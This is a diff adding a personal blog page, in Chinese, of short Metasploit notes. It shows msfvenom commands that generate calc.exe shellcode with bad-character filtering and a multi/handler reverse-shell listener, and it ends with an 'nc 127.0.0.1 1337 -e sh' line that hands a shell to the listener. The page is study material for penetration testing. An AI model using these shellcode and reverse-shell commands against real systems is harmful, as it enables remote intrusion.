@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+    <head>
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-19124306-5', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+<meta name="theme-color" content="#000000">
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="stylesheet" type="text/css" href="/css/css.css">
+
+
+
+<title>Metasploit | r809&#39;s Notes</title>
+
+<script type="text/javascript" async
+  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML">
+</script>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.9/styles/hybrid.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.10.1/css/all.css" integrity="sha256-fdcFNFiBMrNfWL6OcAGQz6jDgNTRxnrLEd4vJYFWScE=" crossorigin="anonymous">
+
+</head>
+    <body><nav id="main-menu">
+    
+    
+    <a href="https://github.com/r888800009" title="">
+        <i class="fab fa-github"></i>
+        
+    </a>
+    
+    <a href="/portfolio/" title="Portfolio">
+        
+        Portfolio
+    </a>
+    
+</nav>
+<div id="main">    <h1 class="website-name" id="website-name"><a href="https://r888800009.github.io/" class="website-name">Metasploit</a></h1>
+<div id="content"><div class="date">
+        <time datetime="2019-09-10 10:26:29 &#43;0800 CST">Tue, 2019 Sep 10</time>
+    </div>
+
+    <aside>
+      <span onclick="tocToggle()" id="TOCStyle">
+        <b>目次</b>
+        <span id="TOCState"></span>
+      </span>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#產生shellcode">產生shellcode</a>
+      <ul>
+        <li><a href="#注意">注意</a></li>
+      </ul>
+    </li>
+    <li><a href="#建立反向shell">建立反向shell</a>
+      <ul>
+        <li><a href="#參見">參見</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </aside>
+
+    <p>查詢審查過的模塊</p>
+<p><a href="https://www.rapid7.com/db/?type=metasploit">Vulnerability &amp; Exploit Database | Rapid7</a></p>
+<h2 id="產生shellcode">產生shellcode</h2>
+<p>顯示payload列表</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -l payload 
+</code></pre></div><p>生成shellcode</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/exec CMD<span style="color:#f92672">=</span>calc.exe -f python 
+</code></pre></div><p>避免含有<code>null</code>字元</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/exec CMD<span style="color:#f92672">=</span>calc.exe -f python -b <span style="color:#e6db74">&#39;\x00&#39;</span>
+</code></pre></div><p>避免含有換行，注意windows的<code>\r</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom -p windows/x64/exec CMD<span style="color:#f92672">=</span>calc.exe -f python -b <span style="color:#e6db74">&#39;\x00\x0a\x0d&#39;</span>
+</code></pre></div><h3 id="注意">注意</h3>
+<p>如果在操作nc時，nc也可能受到<code>\x00</code>、<code>\x0a</code>、<code>\x0d</code>的影響。</p>
+<h2 id="建立反向shell">建立反向shell</h2>
+<p>透過msf的內建session監聽，<code>-q</code>僅用來不打印初始圖像</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q   
+</code></pre></div><p>配置使用模塊</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">use exploit/multi/handler
+set payload generic/shell_reverse_tcp
+</code></pre></div><p>配置反向shell使用端口與地址</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">set lhost 0.0.0.0
+set lport 1337
+run
+</code></pre></div><p>啟動nc進行連結</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 127.0.0.1 <span style="color:#ae81ff">1337</span> -e sh  
+</code></pre></div><h3 id="參見">參見</h3>
+<ul>
+<li><a href="https://metasploit.help.rapid7.com/docs/working-with-payloads">Working with Payloads</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit">How to use a reverse shell in Metasploit</a></li>
+</ul>
+
+    
+      <hr>
+      
+        <a href="https://r888800009.github.io/tags/information-security" class="tags">Information Security</a>
+      
+        <a href="https://r888800009.github.io/tags/pwn" class="tags">pwn</a>
+      
+    
+
+    <script>
+      (function addHeadingLinks(){
+        var article = document.getElementById('content');
+        var headings = article.querySelectorAll('h1, h2, h3, h4, h5, h6');
+        headings.forEach(function(heading){
+          if(heading.id){
+            var a = document.createElement('a');
+            a.innerHTML = '#';
+            a.className = 'subheader';
+            a.href = '#'+heading.id;
+            heading.appendChild(a);
+          }
+        });
+      })();
+    </script>
+
+    <script>
+      function tocToggle() {
+        var toc = document.getElementById("TableOfContents");
+        var state = document.getElementById("TOCState");
+        if (toc.style.display === "none") {
+          state.innerHTML = "[hide]";
+          toc.style.display = "block";
+        } else {
+          state.innerHTML = "[show]";
+          toc.style.display = "none";
+        }
+      }
+      
+      tocToggle();
+      tocToggle();
+    </script>
+
+
+            </div>
+        </div><footer>
+  <hr>
+  <div>
+    <a href="/tags" class="footer">Tags</a>
+    <a href="#website-name" class="footer">Top</a>
+  </div>
+  <div>
+    r888800009©2018-2020.
+    All Rights Reserved.
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/r.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/haskell.min.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+  hljs.registerLanguage("plaintext",function(e){return{disableAutodetect:!0}});
+</script>
+</body>
+</html>
